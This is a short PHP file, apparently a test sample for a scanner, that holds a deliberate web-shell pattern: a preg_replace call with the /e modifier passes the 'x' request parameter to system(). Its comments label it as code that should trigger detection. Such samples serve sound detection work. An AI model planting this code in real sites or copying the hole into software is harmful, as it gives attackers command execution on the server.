<?php
// preg_replace with /e modifier evaluates the replacement as PHP. Removed in
// PHP 7 but very common in older compromised sites.
// Should trigger: preg_replace with /e modifier (eval)
$input = $_GET['x'] ?? '';
echo preg_replace('/(.*)/e', 'system("\\1")', $input);
?>
